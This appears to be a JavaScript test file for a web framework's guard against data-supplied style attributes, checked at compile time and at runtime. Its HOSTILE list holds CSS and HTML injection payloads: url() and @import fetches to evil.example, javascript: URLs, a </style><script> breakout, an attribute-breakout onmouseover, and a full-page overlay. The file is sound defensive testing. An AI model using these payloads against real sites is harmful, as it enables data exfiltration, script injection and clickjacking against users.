// style-attr-guard-s472.test.js — s472-boot-style-attr-guard: a `style=` value from data is refused.
//
// The defect (gap g-bootstrap-style-attr-bound-value-unguarded-s469, MED): `<p style=(@c)>` compiled
// clean and `rt.attr` wrote the cell's whole value into `style` (only URL-valued names were judged),
// so `background: url(https://evil.example/leak)` was a network fetch on first paint.
//
// Governing text, SPEC §65.4.2 ("Applying a style-value — `style=` value-shape overloading"):
//   "`style=<expr>` where `<expr>` is neither a quoted string literal nor a `style`-typed value/list
//    SHALL emit `E-STYLE-VALUE-NOT-STYLE`. Dynamic raw CSS is **only** the quoted-literal form — you
//    cannot apply an arbitrary runtime string as a style-value (that would reopen the injection
//    surface)."
// The bootstrap has no `style` type (a `#{}` in expression position, §65.4.1, is not in it), so every
// expression value of `style=` is refused at compile time. Behind it, `rt.attr` refuses a `style` write
// itself (fail closed — no compiled program asks for one). The bootstrap renders no bound attribute
// on the server: a bound value is written only by the client, so the compile refusal is the wall for
// the page's HTML too (a refused program produces no artifact at all).
//
// Each hostile shape is one cell value. A shape FAILS the pack when the program compiles, or when the
// runtime leaves the hostile text in the element's `style`.

import { describe, test, expect, beforeAll, afterEach, spyOn } from "bun:test";
import { loadM2, frontEnd } from "./harness.js";
import { loadProgram, click, expectNoPageErrors, warmLoadProgram } from "../slice-m1/load-program.js";

let mods;
beforeAll(() => { ({ mods } = loadM2()); warmLoadProgram(); }, { timeout: 120000 });
afterEach(() => expectNoPageErrors());

const run = (src) => frontEnd(mods, [{ path: "s.scrml", src }]);
const codes = (src) => run(src).diags.map((d) => d.code);
const rt = await import("../slice-m1/runtime/runtime.js");

// The attack corpus: what a data-supplied declaration list could do in `style`.
const HOSTILE = [
  ["url() exfiltration (fetch on first paint)", "background: url(https://evil.example/leak?c=1)"],
  ["url(javascript:)", "background-image: url(javascript:alert(1))"],
  ["expression() (legacy IE)", "width: expression(alert(1))"],
  ["`</style>` breakout", "color: red</style><script>window.pwned=1</script>"],
  ["`\"` attribute breakout", "color: red\" onmouseover=\"window.pwned=1"],
  ["@import", "@import url(https://evil.example/x.css)"],
  ["image-set() fetch", "background: image-set(url(https://evil.example/a) 1x)"],
  ["a full-page overlay (UI redress)", "position: fixed; inset: 0; z-index: 2147483647; background: white"],
  ["an escape spelling url", "background: \\75 rl(https://evil.example/)"],
  ["!important", "color: red !important"],
  ["a benign-looking value (still data — refused: no style is built from data)", "color: red; padding: 2px"],
];

const PROGRAM = (attr, value) => `<program>
    let <c:string=${JSON.stringify(value)}/>
    <main>
        <p id="t" ${attr}>x</p>
    </main>
</program>
`;

describe("§65.4.2 — `style=` from data is E-STYLE-VALUE-NOT-STYLE (compile time, every hostile value)", () => {
  for (const [name, v] of HOSTILE) {
    test(name, () => {
      const r = run(PROGRAM("style=(@c)", v));
      expect(r.diags.map((d) => d.code)).toEqual(["E-STYLE-VALUE-NOT-STYLE"]);
    });
  }
});

describe("§65.4.2 — every expression form of `style=` is refused", () => {
  const one = (src) => expect(codes(src)).toEqual(["E-STYLE-VALUE-NOT-STYLE"]);
  test("`style=(@c)` (the S469 reproduction)", () => one(PROGRAM("style=(@c)", "color: red")));
  test("`style=@c` (the bare reactive form)", () => one(PROGRAM("style=@c", "color: red")));
  test("`STYLE=(…)` — any case", () => one(PROGRAM("STYLE=(@c + \"\")", "color: red")));
  test("`style=(…)` — a computed expression", () => one(PROGRAM("style=(\"color: \" + @c)", "red")));
  test("a call", () => one(`<program>
    let <c:string="red"/>
    function css(v: string) -> string { return "color: " + v; }
    <main><p style=css(@c)>x</p></main>
</program>
`));
  test("an <each> row's `style=row.css`", () => one(`type Row:struct = { id: int, css: string }
<program>
    <rows:Row[]=([{ id: 1, css: "background: url(https://evil.example/)" }])/>
    <main><ul><each in=@rows key=@.id as row><li style=row.css>r</li></each></ul></main>
</program>
`));
  test("a declaration's field (reported once, at the definition)", () => one(`<chip st:string>
</>
renders <span class="chip" style=st>c</span>

<program>
    <main>
        <chip st="background: url(https://evil.example/a)"/>
        <chip st="color: red"/>
    </main>
</program>
`));
  test("on an SVG element", () => one(PROGRAM("", "x").replace(`<p id="t" >x</p>`, `<svg><rect width="1" height="1" style=@c/></svg>`)));
  test("`style={…}` stays refused (a braced value is not lowered)", () => {
    expect(codes(PROGRAM("style={@c}", "color: red"))).toContain("E-BOOTSTRAP-UNSUPPORTED");
  });
  test("a quoted `style=\"…${…}…\"` is refused, and its hint no longer steers to `style=(…)`", () => {
    const r = run(PROGRAM("style=\"color: ${@c}\"", "red"));
    expect(r.diags.map((d) => d.code)).toEqual(["E-BOOTSTRAP-UNSUPPORTED"]);
    expect(r.diags[0].message).not.toContain("style=(…)");
    expect(r.diags[0].message).toContain("§65.4.2");
  });
});

// ---------------------------------------------------------------------------
// The runtime wall: `rt.attr` never writes `style` from data.
// ---------------------------------------------------------------------------
const REPORT = "[scrml css-guard] refused a data-supplied `style` write: a style is never built from data (SPEC §65.4.2). The attribute was removed.";

describe("runtime — `rt.attr(…, \"style\", …)` writes nothing and reports without the value (fail closed)", () => {
  for (const [name, v] of HOSTILE) {
    for (const attrName of ["style", "STYLE"]) {
      test(`${name} (${attrName})`, () => {
        document.body.innerHTML = `<p id="w"></p>`;
        const el = document.querySelector("#w");
        const scope = new rt.Scope(rt.root);
        const warn = spyOn(console, "warn").mockImplementation(() => {});
        try {
          let ran = 0;
          rt.attr(scope, el, attrName, () => { ran++; return v; });
          expect(el.hasAttribute("style")).toBe(false);
          expect(el.style.cssText).toBe("");
          expect(ran).toBe(0);
          expect(warn.mock.calls.length).toBe(1);
          expect(String(warn.mock.calls[0][0])).toBe(REPORT);
          expect(window.pwned).toBeUndefined();
        } finally {
          warn.mockRestore();
          scope.dispose?.();
        }
      });
    }
  }
  test("a non-style attribute is still written (the wall is `style` only)", () => {
    document.body.innerHTML = `<p id="w"></p>`;
    const el = document.querySelector("#w");
    const scope = new rt.Scope(rt.root);
    rt.attr(scope, el, "title", () => "background: url(x)");
    expect(el.getAttribute("title")).toBe("background: url(x)");
    scope.dispose?.();
  });
});

// ---------------------------------------------------------------------------
// Benign styles still work: a static `style="…"` (the template, i.e. the page's HTML) and a cell's
// value through the guarded §25.7 bridge.
// ---------------------------------------------------------------------------
describe("benign styles still work", () => {
  test("a static `style=\"…\"` is in the page's HTML and applied", async () => {
    const r = run(`<program>
    <main><p id="st" style="color: red; padding: 2px">x</p></main>
</program>
`);
    expect(r.diags).toEqual([]);
    const { out } = await loadProgram(r.core, "style-static", []);
    expect(out.html).toContain(`style="color: red; padding: 2px"`);
    expect(document.querySelector("#st").getAttribute("style")).toBe("color: red; padding: 2px");
  });
  test("a cell's value reaches CSS through `#{ … @c … }` (the §25.7 bridge), reactively", async () => {
    const r = run(`<program>
    let <c:string="teal"/>
    #{ #t { color: @c; } }
    <main>
        <p id="t">t</p>
        <button id="go" onclick=(@c = "rgb(1, 2, 3)")>go</button>
    </main>
</program>
`);
    expect(r.diags).toEqual([]);
    await loadProgram(r.core, "style-bridge", []);
    const root = document.documentElement.style;
    expect(root.getPropertyValue("--scrml-c")).toBe("teal");
    click(document.querySelector("#go"));
    expect(root.getPropertyValue("--scrml-c")).toBe("rgb(1, 2, 3)");
  });
});
